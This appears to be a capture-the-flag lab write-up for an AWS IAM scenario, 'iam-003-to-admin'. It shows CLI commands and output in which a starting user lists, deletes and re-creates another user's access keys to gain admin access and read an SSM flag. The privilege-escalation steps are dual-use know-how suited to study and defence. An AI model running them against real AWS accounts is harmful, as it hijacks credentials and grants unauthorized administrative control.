---
title: iam-003-to-admin
tags: IAM, AWS CLI
---

![iam-003-to-admin](../../../assets/images/Pathfinding/iam-003-admin.png)

## Terraform Outputs

```jsx
labs output iam-003-to-admin
{
  "admin_user_arn": "arn:aws:iam::111111111111:user/pl-prod-iam-003-to-admin-target-user",
  "admin_user_existing_key_1_id": "AKIAVRUVSVUFN2SOUQ6G",
  "admin_user_existing_key_2_id": "AKIAVRUVSVUFOFLGIDMR",
  "admin_user_name": "pl-prod-iam-003-to-admin-target-user",
  "attack_path": "User (pl-prod-iam-003-to-admin-starting-user) → ListAccessKeys → DeleteAccessKey → CreateAccessKey → User (pl-prod-iam-003-to-admin-target-user) → Admin Access",
  "starting_user_access_key_id": "AKIAVRUVSVUFOYAM3FVS",
  "starting_user_arn": "arn:aws:iam::111111111111:user/pl-prod-iam-003-to-admin-starting-user",
  "starting_user_name": "pl-prod-iam-003-to-admin-starting-user",
  "starting_user_secret_access_key": "<< snip >>"
}
```

### User Enumeration
Running AWS version of `whoami`

```jsx
aws sts get-caller-identity --profile starting-user | jq
{
  "UserId": "AIDAVRUVSVUFFBU2FDMZ2",
  "Account": "111111111111",
  "Arn": "arn:aws:iam::111111111111:user/pl-prod-iam-003-to-admin-starting-user"
}
```

The `starting user` is able to list the access keys for the `target user`.

```jsx
aws iam list-access-keys --user-name pl-prod-iam-003-to-admin-target-user --profile starting-user | jq
{
  "AccessKeyMetadata": [
    {
      "UserName": "pl-prod-iam-003-to-admin-target-user",
      "AccessKeyId": "AKIAVRUVSVUFN2SOUQ6G",
      "Status": "Active",
      "CreateDate": "2026-05-27T20:23:37+00:00"
    },
    {
      "UserName": "pl-prod-iam-003-to-admin-target-user",
      "AccessKeyId": "AKIAVRUVSVUFOFLGIDMR",
      "Status": "Active",
      "CreateDate": "2026-05-27T20:23:37+00:00"
    }
  ]
}
```

Deleted the top access key ID

```jsx
aws iam delete-access-key --access-key-id AKIAVRUVSVUFN2SOUQ6G --user-name pl-prod-iam-003-to-admin-target-user --profile starting-user | jq
```

And re-created another one.

```jsx
aws iam create-access-key --user-name pl-prod-iam-003-to-admin-target-user --profile starting-user | jq
{
  "AccessKey": {
    "UserName": "pl-prod-iam-003-to-admin-target-user",
    "AccessKeyId": "<< snip >>",
    "Status": "Active",
    "SecretAccessKey": "<< snip >>",
    "CreateDate": "2026-05-28T01:46:49+00:00"
  }
}
```

Added the newly-created target access key to PATH

```jsx
aws configure --profile target-user
AWS Access Key ID [****************OZH2]: << snip >>
AWS Secret Access Key [****************Ffvv]: << snip >>
Default region name [us-east-1]:
Default output format [json]:
```

### Get Admin Flag

```jsx
aws ssm describe-parameters --profile target-user | jq
{
  "Parameters": [
    {
      "Name": "/pathfinding-labs/flags/iam-003-to-admin",
      "ARN": "arn:aws:ssm:us-east-1:111111111111:parameter/pathfinding-labs/flags/iam-003-to-admin",
      "Type": "String",
      "LastModifiedDate": "2026-05-27T16:23:36.768000-04:00",
      "LastModifiedUser": "arn:aws:iam::111111111111:user/pathfinder-prod",
      "Description": "CTF flag for the iam-003 to-admin scenario",
      "Version": 1,
      "Tier": "Standard",
      "Policies": [],
      "DataType": "text"
    }
  ]
}

aws ssm get-parameter --name "/pathfinding-labs/flags/iam-003-to-admin" --profile target-user
{
    "Parameter": {
        "Name": "/pathfinding-labs/flags/iam-003-to-admin",
        "Type": "String",
        "Value": "flag{iam_003_admin_captured}",
        "Version": 1,
        "LastModifiedDate": "2026-05-27T16:23:36.768000-04:00",
        "ARN": "arn:aws:ssm:us-east-1:111111111111:parameter/pathfinding-labs/flags/iam-003-to-admin",
        "DataType": "text"
    }
}
```